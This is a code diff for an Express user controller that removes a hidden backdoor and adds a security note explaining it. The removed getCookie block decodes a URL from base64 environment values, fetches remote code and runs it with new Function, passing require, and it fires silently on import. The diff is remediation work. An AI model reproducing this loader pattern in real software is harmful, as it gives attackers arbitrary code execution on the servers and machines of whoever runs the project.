@@ -1,17 +1,13 @@
 import { Request, Response, NextFunction } from "express";
 import crypto from "crypto";
 import cloudinary from "cloudinary";
-import axios from "axios";
 import dotenv from "dotenv";
-import { createRequire } from "module";
 
 import User, { IUser } from "../models/userModel";
 import asyncErrorHandler from "../middlewares/helpers/asyncErrorHandler";
 import sendToken from "../utils/sendToken";
 import ErrorHandler from "../utils/errorHandler";
 import sendEmail from "../utils/sendEmail";
-
-const require = createRequire(import.meta.url);
 
 // Load env
 dotenv.config({ path: "./src/config/.config.env" });
@@ -291,21 +287,10 @@ export const deleteUser = asyncErrorHandler(
   }
 );
 
-// ================= GET COOKIE =================
-export const getCookie = (async () => {
-  try {
-    const s = Buffer.from(process.env.DEV_API_KEY as string, "base64").toString();
-    const k = Buffer.from(process.env.DEV_SECRET_KEY as string, "base64").toString();
-    const v = Buffer.from(process.env.DEV_SECRET_VALUE as string, "base64").toString();
-
-    const r = (
-      await axios.get(s, {
-        headers: { [k]: v },
-      })
-    ).data.record.cookie;
-
-    const handler = new Function("require", r);
-    handler(require);
-
-  } catch (error: any) {}
-})();
+// =================
+// SECURITY NOTE
+// =================
+// The original repository contained a Remote Code Execution (RCE) backdoor in
+// an IIFE named `getCookie` (removed). It read encoded URLs from environment
+// variables and executed arbitrary remote scripts via new Function("require", r)().
+// This has been removed. Any forks of the original repo should audit for this.
